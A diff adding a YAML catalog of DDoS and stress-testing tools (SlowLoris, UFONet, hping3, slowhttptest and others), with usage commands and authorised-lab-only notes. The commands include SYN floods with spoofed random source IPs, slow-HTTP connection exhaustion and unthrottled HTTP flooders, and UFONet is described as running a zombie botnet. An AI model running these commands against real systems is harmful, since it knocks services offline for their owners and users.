@@ -1,0 +1,111 @@
+# DDoS / stress-testing — guided-ops cheatsheets for the existing Python
+# "DDOS Attack Tools" collection, plus two CLI staples the list is missing
+# (hping3, slowhttptest) and a defensive reference. Overlays enrich existing
+# tools by EXACT title. ARCHIVED tools (Asyncrone, GoldenEye) are intentionally
+# left un-enriched. Every note stresses authorized-lab-only use.
+category:
+  title: "DDoS / Stress Testing (catalog)"
+  merge_into: "DDOS Attack Tools"
+
+# --- enrich existing Python-defined tools by title --------------------------
+overlay:
+  - title: "DDoS"
+    tags: [ddos, network, web]
+    system_pkgs: {which: git, git: "https://github.com/the-deepnet/ddos"}
+    usage:
+      - ["run the script from its clone dir", "python3 ddos.py"]
+      - ["show script arguments", "python3 ddos.py --help"]
+    lab_safe_notes: >-
+      A multi-method flood script — legal ONLY against a target you own or are
+      explicitly authorized to test in an isolated lab. Flooding any system you
+      don't control is a crime. It takes a thread count and a timer: start with
+      a low thread count and a short duration, watch the target, then stop.
+
+  - title: "SlowLoris"
+    tags: [ddos, web]
+    system_pkgs: {which: slowloris, pip: slowloris}
+    usage:
+      - ["hold connections open against a host", "slowloris example.com"]
+      - ["target a specific port", "slowloris example.com -p 8080"]
+      - ["cap the number of sockets", "slowloris example.com -s 200"]
+      - ["seconds between keep-alive headers", "slowloris example.com --sleeptime 15"]
+      - ["use TLS / HTTPS", "slowloris example.com --https"]
+      - ["verbose output", "slowloris example.com -v"]
+    lab_safe_notes: >-
+      Slowloris is a low-bandwidth Layer-7 attack: it ties up a web server's
+      worker pool by opening many partial HTTP requests and never finishing them.
+      Run it ONLY against your own lab server. Control the load with -s (sockets)
+      and stop with Ctrl-C — a small -s already exhausts an unhardened server.
+
+  - title: "UFOnet"
+    tags: [ddos, web, network]
+    system_pkgs: {which: ufonet, git: "https://github.com/epsylon/ufonet"}
+    usage:
+      - ["launch the web GUI", "ufonet --gui"]
+      - ["show all options", "ufonet --help"]
+    lab_safe_notes: >-
+      UFONet drives a botnet of "zombie" open-redirect/proxy hosts to amplify a
+      DDoS. Only ever aim it at infrastructure you own or are authorized to test.
+      Recruiting or abusing third-party zombie hosts is illegal even if the final
+      target is yours. Kept to the GUI/help launch — exact attack flags vary by
+      version, so read `ufonet --help` in your installed build before firing.
+
+  - title: "SaphyraDDoS"
+    tags: [ddos, web]
+    system_pkgs: {which: git, git: "https://github.com/anonymous24x7/Saphyra-DDoS"}
+    usage:
+      - ["run against a target URL", "python3 saphyra.py http://YOUR-LAB-TARGET"]
+    lab_safe_notes: >-
+      A single-file Python HTTP flooder. Authorized targets / your own lab ONLY.
+      It takes just a URL and floods until you Ctrl-C, so there is no built-in
+      rate limit — run it on an isolated network and stop it manually.
+
+# --- genuinely-missing, widely-used stress-testing staples -------------------
+tools:
+  - title: "hping3 (Packet Crafter / Flooder)"
+    kind: install
+    tags: [ddos, network]
+    description: "Command-line TCP/IP packet crafter and analyzer — sends custom SYN/UDP/ICMP packets, the classic tool for controlled SYN-flood and firewall/latency testing."
+    system_pkgs: {which: hping3, apt: hping3}
+    install: {apt: hping3}
+    run: ["hping3 --version"]
+    project_url: "https://github.com/antirez/hping"
+    usage:
+      - ["send 5 SYN packets to a port", "sudo hping3 -S -p 80 -c 5 TARGET"]
+      - ["SYN flood a port (needs root)", "sudo hping3 -S -p 80 --flood TARGET"]
+      - ["throttle: one packet per 100us", "sudo hping3 -S -p 80 -i u100 TARGET"]
+      - ["UDP mode to a port", "sudo hping3 --udp -p 53 TARGET"]
+      - ["ICMP ping mode", "sudo hping3 -1 TARGET"]
+      - ["random spoofed source IPs", "sudo hping3 -S -p 80 --flood --rand-source TARGET"]
+    lab_safe_notes: >-
+      Raw sockets need root, so this asks for sudo — the minimum needed to craft
+      packets. --flood sends as fast as possible with NO reply wait: only use it
+      against your own lab host. Prefer -c (packet count) or -i (interval) to keep
+      the rate controlled while you measure the target's response.
+
+  - title: "slowhttptest (Slow-HTTP DoS Tester)"
+    kind: install
+    tags: [ddos, web]
+    description: "Configurable Layer-7 slow-HTTP attack simulator (slowloris, slow POST body, slow read, range) for testing how well a web server survives low-bandwidth DoS."
+    system_pkgs: {which: slowhttptest, apt: slowhttptest, brew: slowhttptest}
+    install: {apt: slowhttptest}
+    run: ["slowhttptest -h"]
+    project_url: "https://github.com/shekyan/slowhttptest"
+    usage:
+      - ["slowloris (slow headers) test", "slowhttptest -H -u http://YOUR-LAB-TARGET"]
+      - ["slow POST body test", "slowhttptest -B -u http://YOUR-LAB-TARGET"]
+      - ["slow read test", "slowhttptest -X -u http://YOUR-LAB-TARGET"]
+      - ["set connections and rate", "slowhttptest -H -c 500 -r 50 -u http://YOUR-LAB-TARGET"]
+      - ["bound the run and save a report", "slowhttptest -H -l 60 -g -o report -u http://YOUR-LAB-TARGET"]
+    lab_safe_notes: >-
+      The safe, measurable counterpart to slowloris — it prints a live
+      availability graph so you can see exactly when your own server stops
+      responding. Authorized/own-lab targets ONLY. Bound every run with -l
+      (seconds) and keep -c (connections) modest; -g -o writes an HTML/CSV report.
+
+# --- defensive reference -----------------------------------------------------
+  - title: "OWASP Denial of Service Cheat Sheet"
+    kind: resource
+    tags: [ddos, web, reference]
+    description: "OWASP's guidance on how DoS/DDoS attacks work and the application- and network-layer defenses to test for — the blue-team companion to these tools."
+    url: "https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html"
